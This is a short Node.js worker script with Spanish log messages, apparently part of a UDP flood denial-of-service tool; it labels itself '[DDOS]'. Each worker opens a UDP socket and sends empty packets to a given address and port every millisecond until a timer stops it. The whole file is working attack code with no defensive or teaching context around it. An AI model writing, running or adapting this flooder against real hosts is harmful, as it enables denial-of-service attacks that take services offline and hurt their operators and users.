const { parentPort } = require('worker_threads');

parentPort.on('message', async ({ address, port, time, thread }) => {
  const dgram = require('dgram');
  const client = dgram.createSocket('udp4');

  let task = null;

  setTimeout(() => {
    task = setInterval(() => {
      client.send('', port, address, (error) => {
        if (error) {
          console.log(`[ERROR #${thread}] no se pudo enviar paquete a ${address}:${port} [${error}]`)
          clearInterval(task);
          console.log(`[DDOS] #${thread}] Detenido`)
          return;
        }
        console.log(`[UDP] #${thread} Enviando a ${address}:${port}...`)
      });

    }, 1)
  }, 3000)

  setTimeout(() => {
    clearInterval(task);
    console.log(`[UDP] #${thread}] Detenido`)
  }, 10024 * 60 * time);

  console.log(`[UDP] #${thread}] Comenzando`)
});
